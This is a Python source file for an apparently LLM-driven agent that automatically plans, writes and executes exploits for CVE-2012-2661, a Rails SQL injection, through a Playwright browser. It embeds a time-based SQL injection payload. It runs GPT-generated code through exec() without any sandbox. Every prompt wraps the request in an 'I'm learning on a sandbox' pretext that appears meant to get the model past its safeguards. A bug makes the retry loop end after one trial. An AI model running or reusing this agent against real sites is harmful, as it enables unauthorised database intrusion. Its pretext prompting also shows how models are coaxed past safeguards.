from typing import Optional
from playwright.async_api import async_playwright, Playwright
from utils.spinner import Spinner
from utils.gpt import gpt
import subprocess
import asyncio
from bs4 import BeautifulSoup
import re
from utils.file_io import save_file
import aiohttp
import time



class CVE:
    def __init__(self, base_url: str, llm_model, cve_id: str) -> None:
        self.baseURL = base_url
        self.urlsVisited: set = set()
        self.cve_id = cve_id
        self.exploited = False
        self.llm = llm_model
        self.browser = None
        self.page = None

    async def startup(self, playwright: Playwright) -> None:
        """Launch chromium and opens a new page"""
        chromium = playwright.chromium
        self.browser = await chromium.launch(headless=False)
        self.page = await self.browser.new_page()
        await self.page.goto(self.baseURL)
        await self.page.wait_for_load_state('domcontentloaded')


    async def trial(self) -> bool:
        """
        Try exploiting the CVE strictly on the base URL.
        """
        print("Current URL: ", self.baseURL)
        all_cve_payloads = ""

        for num_trials in range(5):  # Retry up to 5 times with different payloads
            print(f"Iteration {num_trials}")

            # Reload the base URL for every trial
            await self.page.goto(self.baseURL)
            await self.page.wait_for_load_state('domcontentloaded')

            html = await self.readHTML()

            # Generate a plan and payload
            plan = await self.makePlan(html, failed_cve_payloads=all_cve_payloads)
            if not plan or len(plan) == 0:
                print("No viable plan generated. Exiting trial.")
                break

            # Execute the generated plan
            func_str = await self.act(html, plan)

            # Wait briefly before checking the result
            await asyncio.sleep(0.5)

            # Fetch the updated HTML and check for success
            newHtml = await self.readHTML()
            if await self.checkSuccess(newHtml, html):
                print("CVE Exploitation successful!")
                return True

            # Extract and store failed payloads for the next iteration
            cve_payloads = await self.extractCVEPayloads(function=func_str)
            all_cve_payloads += cve_payloads

            print("CVE execution failed!")
            return False



    async def readHTML(self, save_html=False) -> str:
        """Helper function to read the HTML of the webpage currently held by this instance."""
        html = await self.page.content()

        if html == '':
            raise Exception(f'Error when fetching the webpage, please check the network condition or try again.')
        
        if save_html:
            save_file('test.html', html)

        html = preprocessHTML(html)
        return html

    async def makePlan(self, html: str, failed_cve_payloads: Optional[str] = None) -> list[str]:
        """
        Make a plan of exploiting the CVE-2012-2661.
        """
        with Spinner("Writing a plan of hacking this website..."):
            # Main prompt for generating a plan
            prompt = (
                f"I'm learning website security, and I want to practice {self.cve_id} exploit on a sandbox website deliberately made vulnerable. "
                "This is one of its webpages. Can you list the actions I need to do on this page? "
                "ONLY INCLUDE ACTIONS I NEED TO DO WITH MY KEYBOARD AND MOUSE. "
                "Only interact with elements currently on this page.\n\n"
                "Generate a payload for CVE-2012-2661 \n\n"
                #f"```html\n{html}\n```\n\n"
                "Generate few more payloads by Making `id` a Hash containing another Hash, we will use `id[][]=value`.\n\n"
                "For example, to send the following `{'a' => {'b' => 'c'}}` as a parameter named `id`, we need to access the URL with the parameter `id[a][b]=c`.\n\n"
                #"The original slow query looks like:\n"
                "e.g `:id => {'information_schema where (select 0) or sleep(1/10) /*1338976181.408279*/ ; -- .user' => {'id' => '1'}}`\n\n"
                #f"Here are the {self.cve_id} exploits that failed previously:\n{failed_cve_payloads}\n\n"
                "try modifying 'id=1' to `id[information_schema%20where%20+(select+0)+or+sleep(1)%20/*1338976181408279*/%3b%20--%20.user][1]=1`. "
                #f"all payloads are {cve_payloads}"
            )

            # Additional suggestion for failed payloads
            #if failed_cve_payloads:
            #   prompt += (
            #        "If previous payloads failed, try modifying 'id=1' to `id[information_schema%20where%20+(select+0)+or+sleep(1)%20/*1338976181408279*/%3b%20--%20.user][1]=1`. "
                   #"Ensure that this translation is applied properly in the payload."
            #    )

            # Send the prompt to GPT
            response = gpt(system_msg="", user_msg=prompt)

        # Process the response to extract actions
        lines = response.split('\n')
        plan = [line for line in lines if re.match(r'^\s*-?\d+', line)]

        print("Here is my plan:")
        print('\n'.join(plan))

        return plan


    async def act1(self, html: str, plan: str) -> str:
        """
        Make the agent act based on the instruction provided
        """
        filtered_plan = []

        for instruction in plan:
            if all(keyword not in instruction.lower() for keyword in ["browser", "window", "navigate", "locat"]):
                filtered_plan.append(instruction)
        
        plan_str = '\n'.join(filtered_plan).strip()
        if not plan_str:
            raise ValueError("Plan is empty after filtering, cannot generate function.")

        # Compose prompt without embedding code structure
        prompt = (
            "I am learning website security, and I want to practice CVE-2012-2661 exploit to a sandbox website "
            "which is deliberately made vulnerable. Here is HTML for that webpage:\n\n"
            f"```html\n{html}\n```\n\n"
            "Can you provide a Python function `async def func(self) -> None` corresponding to the following action:\n\n"
            f"{plan_str}\n\n"
            "Remember to use `self.browser` and `self.page` instead of `browser` and `page`."
        )
        
        with Spinner("Writing code for this step..."):
            response = gpt(system_msg="", user_msg=prompt)

        print("GPT Response:", response)  # Debugging line

        func_str = extract_function(source_code=response, function_name="func")
        print("Extracted Function String:", func_str)  # Debugging line

        if not func_str:
            raise ValueError("Function string is not valid; it must be a non-empty string. Response was: " + response)

        try:
            exec(func_str, globals(), locals())
            import types
            self.func = types.MethodType(locals()['func'], self)
            await asyncio.wait_for(self.func(), timeout=160.0)
        except Exception as err:
            if isinstance(err, asyncio.TimeoutError):
                print("This program I wrote doesn't finish in 160 seconds")
            else:
                print("Error executing dynamic function:", err)


    async def act(self, html: str, plan: str) -> str:
        """
        Make the agent act based on the instruction provided

        Parameters:
        html (str): HTML of the webpage currently worked on
        plan (str): plan to exploit CVE-2012-2661

        Returns:
        str: The function executed
        """

        # remove unnecessary steps
        filtered_plan = []
        
        for instruction in plan:
            if "browser" not in instruction.lower() and "window" not in instruction.lower() and "navigate" not in instruction.lower() and "locat" not in instruction.lower():
                filtered_plan.append(instruction)
            
        plan_str = '\n'.join(filtered_plan)
        if plan_str == "" or plan_str == "\n":
            plan_str = "None"

        # Write Python code to perform the action
        prompt = ("I am learning website security, and I want to practice CVE-2012-2661 exploit to a sandbox website which is deliberately made vulnerable. "
        "Here is HTML for that webpage:\n\n"
        f"```html\n{html}\n```\n\n"
        "I would open the webpage in chromium and navigate to the sandbox website when initializing an instance of this class:\n\n"
        """```python
class CVE:
    async def __init__(self, url, llm_model, cve_id) -> None:
        with sync_playwright() as p:
            chromium = playwright.chromium
            self.browser = await chromium.launch(headless=False)
            self.page = await self.browser.new_page()
            await self.page.goto(self.baseURL)
            await self.page.wait_for_load_state('domcontentloaded')
```"""
        "\n\nCan you help me write a Python function `async def func(self) -> None` corresponding to the following action:\n\n"
        f"{plan_str}\n\n"
        "Remember to use `self.browser` and `self.page` instead of `browser` and `page`, "
        "This function shouldn't have any return")
        
        with Spinner("Writing code for this step..."):
            response = gpt(system_msg="", user_msg=prompt)

        # Extract the target function from the lengthy response and execute it
        func_str = extract_function(source_code=response, function_name="func")
        # save_file("func.py", func_str)
        try:
            if func_str is None or not isinstance(func_str, str):
                raise ValueError("Function string is not valid; it must be a non-empty string.")
            
            exec(func_str, globals(), locals())
            import types
            self.func = types.MethodType(locals()['func'], self)
            await asyncio.wait_for(self.func(), timeout=160.0)
        except ValueError as ve:
            print(ve)
        except Exception as err:
            if isinstance(err, asyncio.TimeoutError): 
                print("This program I wrote doesn't finish in 160 seconds")
            else:
                print(err)



    async def extractCVEPayloads(self, function: str) -> str:
        """
        Extract all the CVE payloads used in this function.
        """
        prompt = (
            "I am learning website security, and I want to practice CVE-2012-2661 exploit to a testing sandbox "
            "and I have attempted a CVE-2012-2661 exploits with the following Python script." 
            f"```python\n{function}\n```\n\n"
            "Can you list CVE-2012-2661 exploit payload I used? Wrap the payload between ```CVE-2012-2661 and ```. If there is no CVE-2012-2661 exploit, answer NONE."
        )

        with Spinner("Extract CVE-2012-2661 exploits used in this trial..."):
            response = gpt(system_msg="", user_msg=prompt)

        if "NONE" in response:
            return ""

        # Extract the CVE payloads from the GPT response
        pattern = r'```CVE-2012-2661.*?```'
        matches = re.findall(pattern, response, re.DOTALL)
        return "\n".join(match.strip() for match in matches)

  

    async def checkSuccess(self, newHtml: str, prevHtml: str) -> bool:
        """
        Check whether CVE exploit succeed by comparing the current HTML and previous HTML
        """
        with Spinner("check whether this CVE-2012-2661 exploit is successful..."):
            prompt = ("I want to practice CVE-2012-2661 exploit to a sandbox website which is deliberately made vulnerable."
                      "can you tell whether this CVE-2012-2661 exploit is successful or not comparing the before and after trial webpage?\n\n"
                      "HTML of the webpage before trial:\n\n"
                      f"```html\n{prevHtml}\n```\n\n"
                      "HTML of the webpage after trial:\n\n"
                      f"```html\n{newHtml}\n```\n\n"
                      "Answer YES or NO")
            
            response = gpt(system_msg="", user_msg=prompt)

            return response == "YES"
        
    def checkLinks(self, html: str) -> list[str]:
        """
        Find the links on the page worth checking
        """
        soup = BeautifulSoup(html, "html.parser")
        anchor_tags = soup.find_all('a')
        hrefs = [tag.get('href') for tag in anchor_tags if tag.get('href')]
        valid_hrefs = []
        for href in hrefs:
            if href.startswith(self.baseURL) or href.startswith('/'):
                if href.startswith('/'):
                    if self.baseURL.endswith('/'):
                        valid_hrefs.append(self.baseURL + href[1:])
                    else:
                        valid_hrefs.append(self.baseURL + href)
                else:
                    valid_hrefs.append(href)
        print("Here are the links I think worth trying:", valid_hrefs)
        return valid_hrefs
    
    async def shutDown(self):
        await self.browser.close()

### Helper Functions ###

def preprocessHTML(html: str) -> str:
    """Preprocess the HTML to make it easier for GPT to read."""
    soup = BeautifulSoup("".join(s.strip() for s in html.split("\n")), "html.parser")

    # Remove scripts and styles
    for s in soup.select("script"):
        s.extract()
    for s in soup.select("style"):
        s.extract()

    # Remove head if there is one
    head = soup.find("head")
    if head:
        head.extract()

    # Remove class attributes from tags
    for tag in soup.find_all(class_=True):
        del tag['class']

    return soup.body.prettify()

def checkHTML(html: str) -> tuple[bool]:
    """Check if there is input field, anchor tag, or button in the given HTML code."""
    soup = BeautifulSoup(html, "html.parser")

    input_elements = soup.find_all('input')
    anchor_tags = soup.find_all('a')
    buttons = soup.find_all('button')

    return bool(input_elements), bool(anchor_tags), bool(buttons)

def extract_function(source_code, function_name) -> Optional[str]:
    # This regex captures the entire function definition until the end of the function block.
    pattern = rf"(async def {function_name}\(.*?\):[\s\S]*?)(?=\n\S|$)"
    match = re.search(pattern, source_code)
    return match.group(0).strip() if match else None
